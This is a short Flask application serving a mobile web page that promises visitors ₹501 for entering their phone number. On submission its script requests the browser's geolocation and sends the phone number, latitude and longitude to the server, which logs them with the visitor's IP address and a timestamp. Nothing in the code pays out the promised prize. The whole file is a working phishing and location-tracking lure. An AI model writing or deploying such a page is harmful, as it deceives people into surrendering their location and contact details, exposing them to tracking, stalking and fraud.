from flask import Flask, request, render_template_string
import datetime

app = Flask(__name__)

# HTML Template with mobile-friendly design
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Get ₹501</title>
<style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    input, button { padding: 10px; margin-top: 10px; font-size: 18px; width: 80%; max-width: 300px; }
</style>
</head>
<body>
    <h2>🎉 Win ₹501 Now!</h2>
    <p>Please enter your mobile number to claim:</p>
    <input type="text" id="phone" placeholder="Enter your number">
    <button onclick="sendData()">Submit</button>

<script>
function sendData() {
    let phone = document.getElementById('phone').value;
    if (!phone) { alert("Please enter your number"); return; }

    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(pos) {
            fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    phone: phone,
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude
                })
            }).then(() => alert("Submitted!"));
        }, function() {
            alert("Location permission denied.");
        });
    } else {
        alert("Geolocation not supported.");
    }
}
</script>
</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_PAGE)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json()

    # Get public IP even if behind proxy
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Timestamp
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # Log in table format
    print(f"{'-'*50}")
    print(f"{'Time':<20} | {'Phone':<15} | {'IP':<15} | {'Latitude':<10} | {'Longitude':<10}")
    print(f"{timestamp:<20} | {data.get('phone', ''):<15} | {ip:<15} | {data.get('lat', ''):<10} | {data.get('lon', ''):<10}")
    print(f"{'-'*50}")

    return {"status": "success"}

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
